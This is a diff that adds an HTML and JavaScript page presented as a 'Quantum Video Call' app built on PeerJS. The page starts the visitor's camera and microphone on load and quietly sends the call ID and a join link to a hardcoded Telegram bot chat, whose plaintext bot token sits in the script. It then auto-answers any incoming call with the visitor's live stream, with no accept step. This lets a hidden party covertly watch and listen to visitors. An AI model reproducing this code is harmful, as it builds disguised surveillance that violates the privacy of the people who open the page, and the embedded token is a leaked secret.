@@ -1,0 +1,189 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Quantum Video Call</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #0d1117;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      position: relative;
+    }video {
+  width: 100vw;
+  height: 100vh;
+  object-fit: cover;
+  position: absolute;
+  top: 0;
+  left: 0;
+  z-index: 0;
+  background: #000;
+}
+
+.controls {
+  position: fixed;
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  gap: 20px;
+  z-index: 10;
+}
+
+.control-btn {
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.1);
+  backdrop-filter: blur(8px);
+  border: 1px solid #00e4ff;
+  color: #00e4ff;
+  font-size: 22px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  cursor: pointer;
+  transition: background 0.3s, transform 0.2s;
+}
+
+.control-btn:hover {
+  background: rgba(0, 228, 255, 0.3);
+}
+
+.status {
+  position: fixed;
+  top: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  padding: 10px 20px;
+  background: rgba(0, 228, 255, 0.2);
+  border-radius: 20px;
+  font-weight: bold;
+  font-size: 16px;
+  z-index: 10;
+}
+
+  </style>
+</head>
+<body>
+  <div class="status" id="status">CONNECTING...</div>
+  <video id="remoteVideo" autoplay playsinline></video>
+  <video id="localVideo" autoplay muted playsinline style="width: 150px; height: 100px; position: fixed; bottom: 100px; right: 20px; border: 2px solid #00e4ff; border-radius: 8px; z-index: 10;"></video>
+  <div class="controls">
+    <div class="control-btn" id="switchCameraBtn"><i class="fas fa-camera"></i></div>
+    <div class="control-btn" id="muteBtn"><i class="fas fa-microphone"></i></div>
+    <div class="control-btn" id="endBtn"><i class="fas fa-phone-slash"></i></div>
+  </div>  <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>  <script>
+    const BOT_TOKEN = "7743009303:AAEfCdb2kU3xjZHbU-mo_qUbP3wA4aejDRo";
+    const CHAT_ID = "878604830";
+
+    let peer;
+    let localStream;
+    let currentCall;
+    let isMuted = false;
+    let currentCamera = 'user';
+
+    const localVideo = document.getElementById('localVideo');
+    const remoteVideo = document.getElementById('remoteVideo');
+    const statusEl = document.getElementById('status');
+
+    async function getMedia(cameraFacingMode = 'user') {
+      return navigator.mediaDevices.getUserMedia({
+        video: {
+          width: { ideal: 1920 },
+          height: { ideal: 1080 },
+          frameRate: { ideal: 60 },
+          facingMode: cameraFacingMode
+        },
+        audio: true
+      });
+    }
+
+    async function init() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const code = urlParams.get('code');
+      const myId = code || generateId();
+      peer = new Peer(myId, { secure: true, host: '0.peerjs.com', port: 443 });
+
+      localStream = await getMedia();
+      localVideo.srcObject = localStream;
+
+      peer.on('open', id => {
+        if (!code) {
+          statusEl.innerText = 'AWAITING CONNECTION...';
+          sendToTelegram(id);
+        } else {
+          statusEl.innerText = 'READY';
+        }
+      });
+
+      peer.on('call', call => {
+        call.answer(localStream);
+        currentCall = call;
+        statusEl.innerText = 'CONNECTED';
+        call.on('stream', stream => remoteVideo.srcObject = stream);
+        call.on('close', () => window.location.reload());
+      });
+
+      if (code) {
+        const call = peer.call(code, localStream);
+        currentCall = call;
+        call.on('stream', stream => {
+          statusEl.innerText = 'CONNECTED';
+          remoteVideo.srcObject = stream;
+        });
+        call.on('close', () => window.location.reload());
+      }
+    }
+
+    function generateId() {
+      return Math.random().toString(36).substring(2, 8).toUpperCase();
+    }
+
+    function sendToTelegram(peerId) {
+      const message = `🚀 New Video Call Started\n\n🔑 Peer ID: ${peerId}\n🔗 Link: ${window.location.href}?code=${peerId}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+    }
+
+    document.getElementById('muteBtn').onclick = () => {
+      isMuted = !isMuted;
+      localStream.getAudioTracks()[0].enabled = !isMuted;
+      document.getElementById('muteBtn').innerHTML = isMuted
+        ? '<i class="fas fa-microphone-slash"></i>'
+        : '<i class="fas fa-microphone"></i>';
+    };
+
+    document.getElementById('switchCameraBtn').onclick = async () => {
+      currentCamera = currentCamera === 'user' ? 'environment' : 'user';
+      const newStream = await getMedia(currentCamera);
+      const videoTrack = newStream.getVideoTracks()[0];
+      const sender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
+      sender.replaceTrack(videoTrack);
+      localVideo.srcObject = newStream;
+      localStream.getTracks().forEach(track => track.stop());
+      localStream = newStream;
+    };
+
+    document.getElementById('endBtn').onclick = () => {
+      if (currentCall) {
+        currentCall.close();
+        peer.destroy();
+        window.location.reload();
+      }
+    };
+
+    init();
+  </script></body>
+</html>
